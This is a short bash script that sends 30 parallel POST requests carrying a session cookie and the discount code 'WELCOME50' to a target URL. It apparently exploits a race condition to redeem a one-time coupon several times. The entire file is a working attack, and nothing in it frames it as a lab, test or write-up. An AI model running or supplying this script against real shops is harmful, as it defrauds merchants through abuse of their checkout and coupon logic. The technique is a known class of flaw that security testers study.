#!/bin/bash

TARGET=$1

for i in $(seq 1 30); do
  curl -s -X POST $TARGET \
    -H "Cookie: $COOKIE" -d '{"code":"WELCOME50"}' &
done
wait

